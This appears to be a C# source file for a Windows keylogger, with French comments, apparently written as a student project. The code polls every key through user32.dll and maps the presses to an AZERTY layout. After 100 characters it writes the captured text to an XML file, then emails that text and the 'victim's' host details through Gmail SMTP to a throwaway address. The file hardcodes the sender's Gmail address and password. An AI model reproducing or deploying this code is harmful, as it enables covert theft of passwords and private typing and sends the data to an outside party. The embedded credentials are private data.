﻿using System;
using System.Collections.Generic;
using System.IO;
using System.Xml.Serialization;
using System.IO;
using System.Xml.Serialization;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Net.Mail;
using System.Threading;
using System.Windows.Input;

namespace ProjetKeyLogger
{
    class KeyLogger
    {
        //Texte saisie depuis le dernier clic ou, touche "entré", ou temps > 30 seconde
        private CollectionEnregistrement collection_enregistrement;

        private string file_path;

        public string File_Path
        {
            get
            {
                return file_path;
            }
        }

        //Constructeur(peut etre pas nécessaire)
        public KeyLogger()
        {
            //On initialise la collection
            collection_enregistrement = new CollectionEnregistrement();

            //Chemin pour enregistrer le fichier XML
            file_path = "../../../Fichier XML/TestXML.xml";
        }

        //GetAsyncKeyState function : permet de savoir si une touche ets activé ou non
        //Cette fonction vient d'une librairie stockée dans user32.dll (le keylogger ne marche donc que sur windows, pas mac)
        // l'argument est une "virtual key code " car chaque action est asscoiée à une clé


        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(int cle);

        //La fonction capture ne marche pas avec des claviers tactiles sur l'écran
        public void capture()
        {
            //Création d'un objet Enregistrement qui contiendra le contenu de la capture clavier
            Enregistrement enregistrement = new Enregistrement();

            //Initialisation du nombre de caractere tapé
            int nb_caractere_tape = 0;

            //capture les frappes de touches et les afficher dans la console
            bool majuscule = false;

            while (true) //boucle "infinie" pour avoir le statut des touches en temps réel
            {
                //Comme on a une boucle infinie, il faut permettre aux autres fonctions de se déclencher et donc arreter la boucle temporairement
                Thread.Sleep(5); //nombre en miliseconde

                //booleen qui autorise ou non la saisie du clavier (On l'autorise pour l'instant)
                Boolean autorise_saisie = true;

                //liste des touches pour lesquelles la saisie est intérrompue
                //Si une de ces touches est enfoncé, la capture est intérompu exemple : "ctrl + c" la lettre "c" n'est pas capturé
                int[] list_non_accepte = new int[] { 17 ,18 ,91,16,161 };

                //le tableau des touches d'interruptions de la capture est parcouru
                for (int i = 0; i < list_non_accepte.Length; i++)
                {
                    //Si la touche est enfoncée on suspend l'autorisation de saisie du texte
                    int statut_cle = GetAsyncKeyState(list_non_accepte[i]);
                    if (statut_cle == 32769) { autorise_saisie = false;  }
                }

                //verification de l'état de chaque touche (up ou down)
                //avec une table des code ASCII, les codes de clavier vont de 0 à 127
                //on va vérifier ces 128 touches
                
                for (int codeASCII = 0; codeASCII < 256; codeASCII++)
                {
                    string valeurs = "";
                    int statut_cle = GetAsyncKeyState(codeASCII);
                    //le statut d'un clé est a 0 si elle n'est pas active
                    //le statut est a 32769 si la touche est appuyé donc on va pouvoir voir les touches
                    // on caste le nombre ascii en char
                    if (statut_cle == 32769 && autorise_saisie == true)
                    {
                        switch (codeASCII)
                        {
                            
                            //Si touche Entrée
                            case 13:
                                //Sinon on peut faire un console.writeline tout simplement ?
                                //On ajoute l'enregistrement a la collection
                                collection_enregistrement.ajouterNew(enregistrement);

                                //On réinitialise l'enregistrement
                                enregistrement = new Enregistrement();
                                break;

                            //si touche majuscule
                            case 20:
                                if ( majuscule == false)
                                {
                                    majuscule = true;
                                } else
                                {
                                    majuscule = false;
                                }
                               break;
                            case 8:
                                enregistrement.effacerContenu();
                                break;
                            case 9:
                                Console.Write(" ");
                                break;

                            case 48:
                            case 49:
                            case 50:
                            case 51:
                            case 52:
                            case 53:
                            case 54:
                            case 55:
                            case 56:
                            case 57:
                                valeurs = "à&é\"'(-è_ç";
                                Console.Write(valeurs.Substring(codeASCII - 48, 1));
                                break;

                            //cas du pavé numérique
                            case 96:
                            case 97:
                            case 98:
                            case 99:
                            case 100:
                            case 101:
                            case 102:
                            case 103:
                            case 104:
                            case 105:
                                Console.Write((int)codeASCII - 96);
                                break;

                            case 106:
                            case 107:
                            case 109:
                            case 110:
                            case 111:
                                valeurs = "*+ -./";
                                Console.Write(valeurs.Substring(codeASCII - 106, 1));
                                break;

                                                         
                            case 186:
                            case 187:
                            case 188:
                            case 190:
                            case 191:
                            case 192:
                                valeurs = "$=, ;:ù£+? ./%";
                                if (majuscule == false)
                                {
                                    Console.Write(valeurs.Substring(codeASCII - 186, 1));
                                }
                                else
                                {
                                    Console.Write(valeurs.Substring(codeASCII - 179, 1));
                                }
                                break;

                            //faire une correction pour que ca fasse directement la lettre ê par exemple avec la touche ^ ?
                            case 219:
                            case 220:
                            case 221:
                            case 223:
                                valeurs = ")*^ !°µ¨ §";
                                if (majuscule == false)
                                {
                                    Console.Write(valeurs.Substring(codeASCII - 219, 1));
                                }
                                else
                                {
                                    Console.Write(valeurs.Substring(codeASCII - 214, 1));
                                }
                                break;
                               

                            default:
                                if (majuscule == false)
                                {
                                    Console.Write(Char.ToLower((char)codeASCII));
                                }
                                else
                                {
                                    Console.Write(Char.ToUpper((char)codeASCII));
                                }
                                
                                //Concatenation e la derniere touche tapée au contenu de l'enregistrement
                                enregistrement.ajouterContenu((char)codeASCII);
                                //Sinon on incrémente le nombre de caracteres tapé
                                nb_caractere_tape += 1;
                                break;

                        }

                       
                        //Si plus de 100 caracteres ont été tapé
                        if (nb_caractere_tape > 100)
                        {
                            //On enregistre le contenue en xml
                            collection_enregistrement.saveToXml(file_path);

                            //on cache le xml
                          //  File.SetAttributes(file_path, FileAttributes.Hidden);
                            //pour voir le xml panneau de configuration > Appareance et personalisation > afficher les fichiers et dossiers cachés > fichiers et dossiers cachés puis decocher la case


                            //On reinitialise le nombre de caracteres
                            nb_caractere_tape = 0;

                            //On réinitialise la collection
                            collection_enregistrement = new CollectionEnregistrement();

                            //Puis on envoie un mail
                            envoieMail();
                        }


                    }
                }
            }
        }


        //Envoyer du fichier par mail
        private void envoieMail()
        {
            string Chemin_Dossier = "../../../Fichier XML";
            string Chemin_Txt = Chemin_Dossier + @"/TestXML.xml";

            //recuperation du contenu du fichier
            string Contenu = File.ReadAllText(Chemin_Txt);

            //date du mail
            DateTime Date_Mail = DateTime.Now;
            //l'object du mail
            string Objet_Mail = "Capture keylogger";
            //recuperation de l'adresse ip de l'ordinateur pour identifier notre victime
            var Nom_Ordinateur = Dns.GetHostEntry(Dns.GetHostName());

            //Création du corps du mail
            //Utiliser les autres fonctions de charlie 
            string Corps_Mail = "date :" + Date_Mail + "\n Adresse ip de la victime :" + Nom_Ordinateur + "\n";
            Corps_Mail += Contenu;

            //Envoie du mail avec le protocole SMTP (utilisation d'une adresse gmail dans ce cas mais on peut changer)
            //587=numero de port de gmail
            SmtpClient Client = new SmtpClient("smtp.gmail.com", 587);
            MailMessage Message_Mail = new MailMessage();

            //definition de l'adresse mail qui envoie
            //Cette adresse à été crée spécialement pour ce projet à but non lucratif et seulement éducatif.
            Message_Mail.From = new MailAddress("jordan.leeon2@gmail.com");

            //definition de l'adresse de destination 
            //Création d'un mail temporaire. On peut aussi mettre notre adresse mail!
            //site de création du mail : temp-mail.org
            Message_Mail.To.Add("jejarer632@nonicamy.com");

            //defition de l'objet du mail
            Message_Mail.Subject = Objet_Mail;

            //En true, elle utilise les identifiant de l'utilisateur actuel. En false, elle utilise les valeurs que nous lui donnons plus bas
            Client.UseDefaultCredentials = false;

            //utilisation du protocole SSL (Secure sockets Layer) pour transporter de manière sécurisée
            Client.EnableSsl = true;

            //UseDefaultCredentials étant déclaré en False, il faut lui fournier les inforamtions de connexion 
            Client.Credentials = new System.Net.NetworkCredential("jordan.leeon2@gmail.com", "projetc#2020");

            //définition du corps du mail
            Message_Mail.Body = Corps_Mail;

            //Envoie du message
            Client.Send(Message_Mail);

        }


    }
}
